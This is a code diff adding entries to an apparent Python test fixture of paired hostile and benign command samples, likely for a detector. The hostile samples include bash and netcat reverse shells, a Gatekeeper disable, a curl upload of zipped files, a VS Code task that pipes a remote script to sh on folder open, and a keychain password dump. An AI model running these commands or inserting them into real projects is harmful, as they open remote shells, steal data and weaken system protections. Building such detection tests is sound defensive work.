@@ -642,6 +642,36 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"finger alice@example.invalid\r\n",
         ),
         (
+            "script_reverse_shell",
+            b"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\n",
+            b"echo > /dev/tcp/127.0.0.1/22 && echo open\n",
+        ),
+        (
+            "script_reverse_shell",
+            b"nc -e /bin/sh 192.0.2.10 4444\n",
+            b"nc -zv example.invalid 443\n",
+        ),
+        (
+            "macos_gatekeeper_disable",
+            b"sudo spctl --master-disable\n",
+            b"sudo spctl --master-enable\n",
+        ),
+        (
+            "macos_archive_upload",
+            b"ditto -c -k --keepParent /tmp/c /tmp/o.zip\n"
+            b"curl -F file=@/tmp/o.zip https://example.invalid/u\n",
+            b"ditto -c -k --keepParent build/Inert.app Inert.zip\n"
+            b"xcrun notarytool submit Inert.zip --wait\n",
+        ),
+        (
+            "dev_vscode_autorun_task",
+            b'{"tasks":[{"label":"setup","type":"shell",'
+            b'"command":"curl -s https://example.invalid/a | sh",'
+            b'"runOptions":{"runOn":"folderOpen"}}]}\n',
+            b'{"tasks":[{"label":"watch","type":"npm","script":"watch",'
+            b'"runOptions":{"runOn":"folderOpen"}}]}\n',
+        ),
+        (
             "macos_keychain_dump",
             b"security find-generic-password -ga Chrome\n",
             b"security find-generic-password -s Chrome\n",
